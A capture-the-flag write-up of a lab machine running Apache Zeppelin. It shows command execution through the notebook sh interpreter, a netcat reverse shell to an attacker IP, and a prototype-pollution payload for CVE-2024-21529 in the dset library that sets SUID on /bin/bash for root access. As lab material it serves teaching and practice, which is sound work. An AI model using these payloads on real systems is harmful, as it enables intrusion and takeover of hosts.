### Exploitation

First of all, there is a web page on port HTTP 8080:
![](/assets/img/Pasted-image-20250219112745.png)

It seems like the CMS is called Zeppelin, so I searched for possible exploits an I found this interesting [Zeppelin RCE tricks](https://exploit-notes.hdks.org/exploit/web/apache-zeppelin-pentesting/) page, which explains how is possible to run commands from notebooks, after testing some of the Interpreters, none of the worked, except for the `sh`:
![](/assets/img/Pasted-image-20250219112952.png)

Once I identified that `sh` interpreter worked using the command `cat /etc/passwd`:
![](/assets/img/Pasted-image-20250219113253.png)

Then all you need to execute is your favorite reverse shell command:
```bash
nc -e /bin/bash 10.10.5.122 1234
```

### Privilege Escalation

For privilege escalation there is a script that we can run as sudo without password:
```bash
ETSCTF@zeppelin:/opt/zeppelin-0.11.0-bin-all$ sudo -l
Matching Defaults entries for ETSCTF on zeppelin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User ETSCTF may run the following commands on zeppelin:
    (ALL : ALL) NOPASSWD: /opt/node/bin/setter
```
Its content is like this:
```bash
#!/opt/node/bin/node
var args = process.argv.slice(2);
(async () => {
  const lib = await import('dset');
  var obj = args[0]
  var prop = args[1]
  var val = args[2]
  try {
    lib.dset(JSON.parse(obj), JSON.parse(prop), val)
  } catch (e) { }
  var shell = {}
  if(shell.cmd)
  {
    eval(shell.cmd);
  }
```
The interesting part of this script is the `dset` library, after some research, I came up with this [CVE-2024-21529](https://security.snyk.io/vuln/SNYK-JS-DSET-7116691), the vulnerability is because of a prototype pollution, after some testing and some ChatGPT prompts I ended with this payload:
```bash
sudo /opt/node/bin/setter '{}' '[["__proto__"],"cmd"]' 'require("child_process").execSync("chmod +s /bin/bash")'
```
Finally run the bash as root:
```bash
/bin/bash -p
```

### Post Exploitation
Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`


### Credentials
- No credentials were neeeded for this machine


### Notes

- CVE exploits are always something you should always check, even if the version of the app is not the same as in the exploit, is worth to check them anyways, sometimes there are versions of the app that are still vulnerable because the version is a development one such as `1.0.0-dev` which hasn't been patched yet.
